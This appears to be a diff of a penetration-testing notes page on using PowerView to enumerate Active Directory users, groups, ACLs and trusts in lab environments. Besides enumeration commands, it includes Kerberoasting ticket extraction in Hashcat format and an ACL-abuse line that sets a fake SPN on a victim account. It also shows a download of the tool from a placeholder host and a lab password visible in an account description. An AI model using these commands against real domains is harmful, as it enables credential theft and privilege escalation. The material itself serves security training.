@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/powerview.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Read one domain user's directory relationships
+[Search this tool’s saved examples](/commands/notebook?tool=powerview) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Read one domain user's directory relationships
 
 **Run in:** Windows PowerShell. **Requires:** The intended PowerView implementation loaded in a domain-authenticated session with directory connectivity.
 
@@ -22,127 +30,9 @@ Import-Module .\PowerView.ps1
 Get-DomainUser -Identity USER
 ```
 
-**Read the result:** Read object identities, distinguished names, memberships and resolved ACL rights as separate relationships.
-
-**If The function is missing or requested properties are absent:** PowerView functions require the intended module to be loaded; command names vary between versions, and a listed ACE must be evaluated for effective access.
+**What the result establishes:** Read object identities, distinguished names, memberships and resolved ACL rights as separate relationships.
 
 **Next check:** Confirm the module generation and exact object DN; request memberships or ACLs separately to test a specific relationship.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/PowerShellMafia/PowerSploit)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Ask one directory question at a time
-
-PowerView provides functions for directory objects, group relationships, ACLs and host information. Load the intended module, confirm the available functions, and use an exact identity or distinguished name when a broad query finds something interesting. Different PowerView variants expose different names/options.
-
-### Load and establish the domain context
-
-```powershell
-Import-Module .\PowerView.ps1
-Get-Command Get-Domain*
-Get-Domain
-Get-DomainController
-Get-DomainTrust
-```
-
-The script path must refer to the reviewed copy already available in the lab. Module loading does not grant directory or host permissions. Keep the current identity and the queried domain/DC with the result.
-
-### Query users, computers and memberships
-
-```powershell
-Get-DomainUser -Identity USERNAME
-Get-DomainUser -SPN
-Get-DomainComputer
-Get-DomainGroup -Identity GROUP_NAME
-Get-DomainGroupMember -Identity GROUP_NAME -Recurse
-```
-
-Read descriptions, SPNs, distinguished names and membership relationships as separate facts. A computer object may be stale or offline. An SPN-bearing account needs the separate Kerberoasting/delegation prerequisite analysis before choosing either branch.
-
-### Resolve an object permission
-
-```powershell
-Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
-```
-
-Resolve the trustee SID and account/group membership. Check whether the right applies to the intended object/attribute and whether it is inherited or constrained. GenericWrite, WriteDACL, WriteOwner and a particular extended right do not mean the same thing.
-
-### Connect host findings to your access
-
-```powershell
-Get-DomainComputer -Identity TARGET_HOST
-Get-DomainUser -Identity USERNAME -Properties samaccountname,memberof,serviceprincipalname,description
-```
-
-Select the attributes you need and inspect them directly. For host-local sessions or administrator checks, first establish connectivity and the permission needed by that query. Directory-read access is not automatically remote administrative access.
-
-### Choose the next branch from evidence
-
-If a group has a useful right, map the nested membership path and resource. If an ACL grants object control, use the ACL guide to identify the exact permissible change. If a service account has an SPN, record its account purpose and relevant privileges. If a trust exists, inspect its direction and resource permissions.
-
-When a function is missing, check the loaded module/variant. When output is empty, distinguish no matching object, wrong domain/identity, omitted property and denied access. Preserve the query and errors so an incomplete collection is not mistaken for an absence of attack paths.
-
-## PowerView: choose the operation and read the result
-
-Import PowerView, then query users, computers and groups.
-
-### What the result establishes
-
-Read object identities, distinguished names, memberships and resolved ACL rights as separate relationships.
-
-### Prerequisites and common failures
-
-PowerView functions require the intended module to be loaded; command names vary between versions, and a listed ACE must be evaluated for effective access.
-
-### Example 1: Commands
-
-Run in: **Windows PowerShell**.
-
-```powershell
-Import-Module .\PowerView.ps1
-Get-DomainUser -Identity USER
-Get-DomainComputer
-Get-DomainGroupMember -Identity "Domain Admins"
-```
-
-### Example 2: PowerView — Load and Enumerate
-
-Run in: **Saved lab example**.
-
-```powershell
-Import-Module .\PowerView.ps1
-Get-Command Get-DomainUser
-Get-DomainUser -Identity YOUR_USERNAME
-```
-
-Saved context: [PowerView — Load and Enumerate — PowerView — Load and Enumerate](/tools/powerview). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: JavaScript (Windows — cscript.exe)
-
-Run in: **Saved lab example**.
-
-```cmd
-cscript.exe /nologo wget.js http://<IP>/PowerView.ps1 PowerView.ps1
-```
-
-Saved context: [File Transfers for Linux and Windows — JavaScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#javascript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Import PowerView, then query users, computers and groups.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=powerview) · [All tools](/index)
 
 ## Commands
 
@@ -155,18 +45,15 @@ Get-DomainComputer
 Get-DomainGroupMember -Identity "Domain Admins"
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [PowerView — Load and Enumerate — Example 1: Commands](/tools/powerview#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| The function is missing or requested properties are absent | PowerView functions require the intended module to be loaded; command names vary between versions, and a listed ACE must be evaluated for effective access. |
 
 ## Notebook recipes
 
-64 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+63 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -510,7 +397,7 @@ PS C:\htb> $sid = Convert-NameToSid wley
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [PowerView — Load and Enumerate — Example 7: Using Find-InterestingDomainAcl](/tools/powerview#example-7-using-find-interestingdomainacl) · [ACL Enumeration — Using Find-InterestingDomainAcl](/active-directory/acl-enumeration#using-find-interestingdomainacl)
+**Original note sections:** [ACL Enumeration — Using Find-InterestingDomainAcl](/active-directory/acl-enumeration#using-find-interestingdomainacl)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -593,9 +480,33 @@ OpaqueLength           : 0
 
 </Accordion>
 
-<Accordion title="AD ACL Abuse: Quick Reference">
+<Accordion title="Read the descriptor before changing anything">
 
-### AD ACL Abuse: Quick Reference
+### Read the descriptor before changing anything
+
+**AD ACL Abuse: Quick Reference**
+
+```powershell
+# PowerView must already be loaded.
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
+Get-DomainGroupMember -Identity GROUP_NAME -Recurse
+
+# Native AD provider, when available:
+Get-Acl 'AD:\CN=Target,OU=Lab,DC=example,DC=local' | Format-List
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Read the descriptor before changing anything](/active-directory/acl-abuse#read-the-descriptor-before-changing-anything)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Validate one edge and re-enumerate">
+
+### Validate one edge and re-enumerate
 
 **AD ACL Abuse: Quick Reference**
 
@@ -611,7 +522,7 @@ Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [AD ACL Abuse: Quick Reference — Existing notes and worked examples](/active-directory/acl-abuse#existing-notes-and-worked-examples)
+**Original note sections:** [AD ACL Abuse: Quick Reference — Validate one edge and re-enumerate](/active-directory/acl-abuse#validate-one-edge-and-re-enumerate)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -806,9 +717,9 @@ Get-DomainSPNTicket
 
 </Accordion>
 
-<Accordion title="Active Directory Enumeration: Quick Reference">
+<Accordion title="Decide what to do next">
 
-### Active Directory Enumeration: Quick Reference
+### Decide what to do next
 
 **Active Directory Enumeration: Quick Reference**
 
@@ -822,16 +733,36 @@ Find-LocalAdminAccess       # where does my user have local admin?
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Active Directory Enumeration: Quick Reference — Existing notes and worked examples](/active-directory/enumeration#existing-notes-and-worked-examples)
+**Original note sections:** [Active Directory Enumeration: Quick Reference — Decide what to do next](/active-directory/enumeration#decide-what-to-do-next)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Active Directory Trusts: Quick Reference">
+<Accordion title="Enumerate the relationship">
 
-### Active Directory Trusts: Quick Reference
+### Enumerate the relationship
+
+**Active Directory Trusts: Quick Reference**
+
+```powershell
+Get-DomainTrust
+Get-DomainForeignGroupMember
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Trusts: Quick Reference — Enumerate the relationship](/active-directory/domain-trusts#enumerate-the-relationship)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Validate the smallest useful access">
+
+### Validate the smallest useful access
 
 **Active Directory Trusts: Quick Reference**
 
@@ -842,7 +773,47 @@ Get-DomainTrustMapping           # map the whole forest
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Active Directory Trusts: Quick Reference — Existing notes and worked examples](/active-directory/domain-trusts#existing-notes-and-worked-examples)
+**Original note sections:** [Active Directory Trusts: Quick Reference — Validate the smallest useful access](/active-directory/domain-trusts#validate-the-smallest-useful-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="4. Inspect the right, not just the relationship label">
+
+### 4. Inspect the right, not just the relationship label
+
+**Active Directory: Enumeration Methodology**
+
+```powershell
+Get-DomainObjectAcl -Identity 'Helpdesk' -ResolveGUIDs
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory: Enumeration Methodology — 4. Inspect the right, not just the relationship label](/active-directory/methodology#4-inspect-the-right-not-just-the-relationship-label)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Find the prerequisites for common branches">
+
+### Find the prerequisites for common branches
+
+**Active Directory: Enumeration Methodology**
+
+```powershell
+Get-DomainUser -Identity student
+Get-DomainGroupMember -Identity 'Helpdesk' -Recurse
+Get-DomainObjectAcl -Identity 'Helpdesk' -ResolveGUIDs
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory: Enumeration Methodology — Find the prerequisites for common branches](/active-directory/methodology#find-the-prerequisites-for-common-branches)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1236,7 +1207,7 @@ Get-DomainUser * -spn | select samaccountname
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Kerberoasting from Windows — Import PowerView and Enumerate SPN Users](/active-directory/kerberoasting-windows#import-powerview-and-enumerate-spn-users) · [PowerView — Load and Enumerate — Example 6: Import PowerView and Enumerate SPN Users](/tools/powerview#example-6-import-powerview-and-enumerate-spn-users)
+**Original note sections:** [Kerberoasting from Windows — Import PowerView and Enumerate SPN Users](/active-directory/kerberoasting-windows#import-powerview-and-enumerate-spn-users)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1285,7 +1256,7 @@ Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Kerberoasting from Windows — Request a Ticket for One User](/active-directory/kerberoasting-windows#request-a-ticket-for-one-user) · [PowerView — Load and Enumerate — Example 5: Request a Ticket for One User](/tools/powerview#example-5-request-a-ticket-for-one-user)
+**Original note sections:** [Kerberoasting from Windows — Request a Ticket for One User](/active-directory/kerberoasting-windows#request-a-ticket-for-one-user)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1586,9 +1557,9 @@ ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
 
 </Accordion>
 
-<Accordion title="PowerView — Load and Enumerate">
+<Accordion title="Choose the next branch from evidence">
 
-### PowerView — Load and Enumerate
+### Choose the next branch from evidence
 
 **PowerView — Load and Enumerate**
 
@@ -1600,25 +1571,126 @@ Get-DomainUser -Identity YOUR_USERNAME
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [PowerView — Load and Enumerate — Example 2: PowerView — Load and Enumerate](/tools/powerview#example-2-powerview-—-load-and-enumerate) · [PowerView — Load and Enumerate — Existing notes and worked examples](/tools/powerview#existing-notes-and-worked-examples)
+**Original note sections:** [PowerView — Load and Enumerate — Choose the next branch from evidence](/tools/powerview#choose-the-next-branch-from-evidence)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
+</Accordion>
+
+<Accordion title="Connect host findings to your access">
+
+### Connect host findings to your access
+
 **PowerView — Load and Enumerate**
 
-Context from the notebook: Replace  YOUR_USERNAME . Successful import makes the PowerView commands available in  this PowerShell session ; the final command returns the matching directory object. Loading PowerView is different from  Import-Module ActiveDirectory , which loads Microsoft's separate module.
-
-```text
-Import-Module ActiveDirectory
+```powershell
+Get-DomainComputer -Identity TARGET_HOST
+Get-DomainUser -Identity USERNAME -Properties samaccountname,memberof,serviceprincipalname,description
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Active Directory Enumeration from Windows — ActiveDirectory PowerShell Module](/active-directory/enumeration-windows#activedirectory-powershell-module) · [PowerView — Load and Enumerate — Existing notes and worked examples](/tools/powerview#existing-notes-and-worked-examples)
+**Original note sections:** [PowerView — Load and Enumerate — Connect host findings to your access](/tools/powerview#connect-host-findings-to-your-access)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="Load and establish the domain context">
+
+### Load and establish the domain context
+
+**PowerView — Load and Enumerate**
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-Domain*
+Get-Domain
+Get-DomainController
+Get-DomainTrust
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Load and establish the domain context](/tools/powerview#load-and-establish-the-domain-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Query users, computers and memberships">
+
+### Query users, computers and memberships
+
+**PowerView — Load and Enumerate**
+
+```powershell
+Get-DomainUser -Identity USERNAME
+Get-DomainUser -SPN
+Get-DomainComputer
+Get-DomainGroup -Identity GROUP_NAME
+Get-DomainGroupMember -Identity GROUP_NAME -Recurse
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Query users, computers and memberships](/tools/powerview#query-users-computers-and-memberships)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Resolve an object permission">
+
+### Resolve an object permission
+
+**PowerView — Load and Enumerate**
+
+```powershell
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Resolve an object permission](/tools/powerview#resolve-an-object-permission)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="PowerView / SharpView">
+
+### PowerView / SharpView
+
+**SharpView**
+
+```text
+.\SharpView.exe Get-DomainUser -Identity forend
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read one user with the SharpView implementation">
+
+### Read one user with the SharpView implementation
+
+**SharpView**
+
+```powershell
+.\SharpView.exe Get-DomainUser -Identity USER
+```
 
 </Accordion>
 
@@ -1642,163 +1714,11 @@ powershell Find-DomainShare -ComputerDomain domain.local
 
 </Accordion>
 
-<Accordion title="Key Enumeration Methods">
-
-### Key Enumeration Methods
-
-**AD Password Policies and User Lists**
-
-Context from the notebook: With Credentials:  On a domain-joined machine, the built-in  net accounts /domain  command provides a clean, readable summary of the password policy. For more detailed, object-oriented output, PowerShell tools like PowerView ( Get-DomainPolicy ) are extremely effective.
-
-```text
-Get-DomainPolicy
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [AD Password Policies and User Lists — Key Enumeration Methods](/active-directory/password-policy-user-lists#key-enumeration-methods)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="PowerView / SharpView">
-
-### PowerView / SharpView
-
-**Active Directory Enumeration from Windows**
-
-```text
-Get-DomainUser -Identity mmorgan
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Enumeration from Windows**
-
-```text
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Enumeration from Windows**
-
-```text
-Get-DomainTrustMapping
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Enumeration from Windows**
-
-```text
-Test-AdminAccess -ComputerName ACADEMY-EA-MS01
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Enumeration from Windows**
-
-```text
-Get-DomainUser -SPN
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Enumeration from Windows**
-
-```text
-.\SharpView.exe Get-DomainUser -Identity forend
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Enumeration from Windows**
-
-Context from the notebook: Purpose:  The SharpView equivalent of PowerView's  Get-DomainUser  command, executed as a standalone program.
-
-```text
-Get-DomainUser
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Windows — PowerView / SharpView](/active-directory/enumeration-windows#powerview-/-sharpview) · [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Common problems">
-
-### Common problems
-
-**PowerView — Load and Enumerate**
-
-Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\PowerView.ps1 ; open the folder that actually contains the script.
-
-```text
-Get-Location
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems) · [Rubeus — Find a Kerberos Task — Common problems](/tools/rubeus#common-problems)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**PowerView — Load and Enumerate**
-
-Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\PowerView.ps1 ; open the folder that actually contains the script.
-
-```text
-Test-Path .\PowerView.ps1
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/PowerShellMafia/PowerSploit)
 
 {/* VAULT_RELATED_START */}
 
@@ -1807,5 +1727,3 @@ Test-Path .\PowerView.ps1
 - [PowerView — Load and Enumerate](/tools/powerview)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
